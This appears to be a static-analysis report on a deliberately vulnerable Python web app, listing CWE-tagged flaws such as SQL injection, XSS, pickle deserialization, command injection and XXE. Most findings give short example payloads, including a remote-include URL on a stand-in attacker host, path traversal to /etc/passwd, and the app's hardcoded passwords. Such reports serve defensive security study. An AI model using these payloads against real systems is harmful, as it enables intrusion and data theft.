extra.message: The 'id' GET parameter is concatenated directly into a SQL SELECT statement passed to cursor.execute() with no parameterization or escaping, allowing full SQL injection (boolean-blind, time-blind, UNION-based as demonstrated in the built-in CASES list).
The 'comment' GET parameter is string-formatted directly into an INSERT statement passed to cursor.execute(), allowing SQL injection via the comment field.

In /login, 'username' is sanitized with re.sub(r"[^\w]",...) but 'password' is concatenated into the SQL query unsanitized, enabling classic SQL injection authentication bypass (e.g. password=' OR '1'='1).
The 'v' GET parameter is inserted into the HTML response via re.sub without any HTML-escaping, allowing reflected XSS (e.g. ?v=<script>alert(1)</script>).

Comments are stored unsanitized (line 50) and later rendered directly into an HTML table without escaping (line 54: "%s" % comment), resulting in stored/persistent XSS visible to any subsequent visitor of /?comment=.
The 'callback' GET parameter on /users.json is written directly into the response body as raw JavaScript with no validation, allowing arbitrary JavaScript execution via JSONP callback injection.

pickle.loads() is called on the raw, attacker-controlled 'object' GET parameter with no integrity check or restriction, allowing arbitrary object deserialization and remote code execution via a crafted pickle payload (e.g. os.system via __reduce__).

The 'path' GET parameter is passed to os.path.abspath() and opened directly with no restriction to an allowed base directory, allowing arbitrary local file read (path traversal) including source code (dsvw.py) and system files (e.g. /etc/passwd via ../../../etc/passwd).

When the 'path' parameter contains '://', it is passed directly to urllib.request.urlopen(), letting an attacker make the server issue arbitrary outbound HTTP(S)/file requests to internal or external hosts (SSRF), e.g. ?path=http://127.0.0.1:631.

The 'domain' GET parameter is concatenated into a shell command string and executed with subprocess.run(..., shell=True), allowing arbitrary OS command injection (e.g. ?domain=www.google.com; ifconfig).

The 'xml' GET parameter is parsed with lxml.etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False), which enables DTD processing and external entity resolution (including over the network) on fully attacker-controlled XML, allowing local file disclosure and SSRF via XXE.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: The 'name' GET parameter is string-formatted directly into an XPath expression passed to lxml's .xpath(), allowing blind XPath injection to extract arbitrary data (e.g. user passwords) from the XML document.

cwe: CWE-643: Improper Neutralization of Data within XPath Expressions

extra.message: The 'size' GET parameter is used unbounded to build a string of size*size characters ('#' repeated, joined size times), allowing an attacker to trigger excessive memory allocation and CPU usage with a single request (e.g. ?size=9999999), causing denial of service.

cwe: CWE-789: Memory Allocation with Excessive Size Value

extra.message: The 'include' GET parameter is used to open a local file or fetch a remote URL (if it contains '://'), and the resulting content is passed directly to exec(), allowing remote file inclusion and arbitrary Python code execution (e.g. ?include=http://attacker/payload.py).
The 'redir' GET parameter is inserted unvalidated into a meta-refresh redirect target, allowing an open redirect to any attacker-controlled URL (e.g. ?redir=https://evil.example).

cwe: CWE-601: URL Redirection to Untrusted Site

extra.message: On any unhandled exception, the full traceback (traceback.format_exc()) or subprocess error output is returned directly in the HTTP response body to the client, leaking internal file paths, source code context, and implementation details.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: The 'charset' GET parameter is inserted directly into the Content-Type response header value without sanitization for CRLF sequences, allowing HTTP response header/body injection (e.g. ?charset=utf8%0D%0AX-XSS-Protection:0%0D%0A... to inject arbitrary headers and forge response content for phishing).

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax

extra.message: The SESSIONID cookie is set via Set-Cookie with no HttpOnly, Secure, or SameSite attributes, making the session token accessible to client-side JavaScript (exploitable together with the reflected/stored XSS in this app) and transmittable over plain HTTP.

cwe: CWE-1004: Sensitive Cookie Without HttpOnly Flag
CWE-614: Sensitive Cookie Without Secure Attribute

extra.message: The server explicitly sends 'X-XSS-Protection: 0' on every response, disabling the browser's built-in reflected-XSS filter and amplifying the impact of the reflected XSS issues present elsewhere in this handler.

do_GET() exposes highly sensitive functionality (arbitrary file read via 'path', OS command execution via 'domain', pickle deserialization via 'object', and code execution via 'include') to any unauthenticated client with no session/authorization check anywhere in the request handler.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: USERS_XML embeds hardcoded plaintext usernames and passwords (e.g. admin/7en8aiDoh!, dricci/12345) directly in the source code, which are then loaded into the in-memory user database at startup.
